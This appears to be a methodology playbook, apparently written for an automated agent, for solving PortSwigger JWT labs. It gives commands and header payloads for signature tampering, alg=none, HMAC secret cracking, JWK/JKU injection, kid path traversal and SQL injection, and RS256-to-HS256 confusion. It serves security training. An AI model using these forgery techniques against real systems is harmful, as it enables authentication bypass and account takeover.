# JWT Attacks Methodology
## Expert-Level Playbook (alg confusion, key injection, weak secrets)

> 6 PortSwigger labs. Drive every attack with the `jwt_tool` wrapper; only
> change the claim the lab needs (usually `sub`/`username`/role), then replay the
> exact privileged request. Always test the untouched-but-invalid-signature
> control so you can prove the flaw is the signature check, not something else.

---

## Phase 1: Recon

### 1.1 Locate & decode
JWTs live in cookies, `Authorization: Bearer`, `localStorage`, or JS.
```
jwt_tool token=<jwt> target_url=https://TARGET/    # decode header+payload+claims
```
Inspect header: `alg`, `kid`, `jku`, `jwk`, `x5u`, `typ`; payload: `sub`, role,
`iss`, `aud`, `exp`. Find the admin-only endpoint you'll replay against.

---

## Phase 2: Attack Matrix (per sub-variant)

| Sub-variant | Root cause | Attack |
|-------------|------------|--------|
| Unverified signature | server doesn't verify at all | change payload, keep/garble sig |
| `alg: none` | server accepts unsigned | set `alg=none`, strip signature |
| Weak HMAC secret | guessable HS256 key | crack offline, re-sign |
| JWK header injection | server trusts embedded `jwk` | embed your public key, sign RS256 |
| JKU header injection | server fetches `jku` URL | host your JWKS, point `jku` at it |
| KID path traversal | `kid` used in key lookup | `kid` → `/dev/null` / known file → sign with that |
| KID SQL injection | `kid` into SQL key lookup | inject to return a known key |
| Algorithm confusion | RS256 verified as HS256 | sign HS256 using the RSA **public** key as the secret |

### 2.1 Unverified signature / alg=none
```
jwt_tool token=<jwt> mode=tamper   # set username/sub=administrator
# alg=none: header {"alg":"none"} and empty signature segment (trailing '.')
```

### 2.2 Weak HMAC secret (offline crack)
```
jwt_tool token=<jwt> mode=crack wordlist=/usr/share/wordlists/jwt.secrets.list
# or: run_shell command="hashcat -m 16500 jwt.txt wordlist"
# then re-sign with the recovered secret and the tampered payload.
```

### 2.3 JWK injection (self-signed RS256)
Generate an RSA keypair, embed the public key as a `jwk` in the header, sign with
the private key. Server trusts the attached key.
```
jwt_tool token=<jwt> mode=jwk_inject   # or run_shell with jwt_tool -X i
```

### 2.4 JKU injection (host JWKS)
```
# 1) generate keypair; publish JWKS at an in-scope/exploit-server URL
# 2) set header {"alg":"RS256","kid":"<your kid>","jku":"https://exploit-.../jwks.json"}
# 3) sign with your private key
```
Host `jwks.json` with `exploit_server.store(head, body, path="/jwks.json")`.

### 2.5 KID path traversal / SQLi
```
# kid → a file with known contents so you can predict the HMAC key:
{"alg":"HS256","kid":"../../../../../../dev/null"}   # key = empty string
{"alg":"HS256","kid":"/dev/null"}
# Sign HS256 with the empty/known key. For KID SQLi: kid injects a UNION that
# returns a chosen key value.
```

### 2.6 Algorithm confusion (RS256 → HS256)
1. Obtain the server's RSA **public** key (`/jwks.json`, `/.well-known/jwks.json`,
   or derive from two tokens with `jwt_tool`).
2. Sign a tampered token with **HS256** using that public key (PEM) as the secret.
3. Server verifies HS256 with the public key it thinks is for RS256 → accepts.
```
jwt_tool token=<jwt> mode=alg_confusion pubkey=jwks_public.pem
```

---

## Phase 3: Tooling

```
jwt_tool          # decode, tamper, crack, jwk/jku inject, alg-confusion, kid tricks
run_shell         # hashcat/john for secret cracking; openssl for keygen
http_request      # replay the privileged request with the forged token
exploit_server    # host jwks.json for jku injection
```

## Common Failure Modes & Solutions

| Problem | Solution |
|---------|----------|
| Token rejected after tamper | Recompute the signature; check `alg` casing (`none`/`None`) |
| alg=none blocked | Try algorithm confusion or weak-secret crack instead |
| jku not fetched | Ensure `jku` host is reachable/in-scope; match `kid` in header and JWKS |
| Secret not in wordlist | Use a JWT-specific wordlist; try known lab secrets first |
| Confusion fails | Public key must be the exact PEM (trailing newline matters) |

## Validation / Success Criteria
- [ ] Privileged endpoint accepts the forged token.
- [ ] A control token (invalid signature / unchanged claims) is rejected.
- [ ] Only the required claim was changed.
- [ ] Lab solved banner observed.
